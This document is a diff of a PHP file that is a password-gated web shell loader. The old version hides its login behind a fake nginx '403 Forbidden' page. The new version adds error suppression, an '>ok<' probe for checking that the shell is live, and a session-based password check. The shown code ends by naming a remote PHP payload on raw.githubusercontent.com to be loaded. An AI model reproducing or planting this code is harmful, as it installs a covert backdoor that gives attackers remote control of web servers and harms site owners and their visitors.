@@ -1,28 +1,17 @@
 <?php
-$auth_pass = "b713c03bc5f0632a8172292ef537befce70bdbe3846e8e5fa80a8c6339ccbc98";
+error_reporting(0);
+if(isset($_REQUEST["ok"])){die(">ok<");}
 
-function Login() {
-    die("<html>
-    <title>403 Forbidden</title>
-    <center><h1>403 Forbidden</h1></center>
-    <hr><center>nginx (You don't have permission access to server / on this server)</center>
-    <center><form method='post'><input type='password' name='pass' style='text-align:center;margin:0;margin-top:0px;background-color:#fff;border:1px solid #fff;'></form></center>
-    </html>");
-}
-
-function VEsetcookie($k, $v) {
-    $_COOKIE[$k] = $v;
-    setcookie($k, $v);
-}
-
-if (!empty($auth_pass)) {
-    if (isset($_POST['pass']) && hash('sha256', $_POST['pass']) === $auth_pass) {
-        VEsetcookie(md5($_SERVER['HTTP_HOST']), $auth_pass);
-    }
-
-    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || $_COOKIE[md5($_SERVER['HTTP_HOST'])] !== $auth_pass) {
-        Login();
-    }
+if (function_exists('session_start')) { 
+    session_start(); 
+    if (!isset($_SESSION['secretyt'])) { $_SESSION['secretyt'] = false; } 
+    if (!$_SESSION['secretyt']) { 
+        if (isset($_POST['pwdyt']) && hash('sha256', $_POST['pwdyt']) == '0a3fae3a3a24655a1a6f77b2d00df00ad0aa3493ac173ef1a09aa4e61a3cc51d') {
+            $_SESSION['secretyt'] = true; 
+        } else { 
+            die('<html><head><meta charset="utf-8"><title></title><style type="text/css">body {padding:10px} input { padding: 2px; display:inline-block; margin-right: 5px; }</style></head><body><form action="" method="post" accept-charset="utf-8"><input type="password" name="pwdyt" placeholder="passwd"><input type="submit" name="submit" value="submit"></form></body></html>'); 
+        } 
+    } 
 }
 
 $remote_file = "https://raw.githubusercontent.com/soy777/johnygreenwoodsz/main/lotusflower.php";
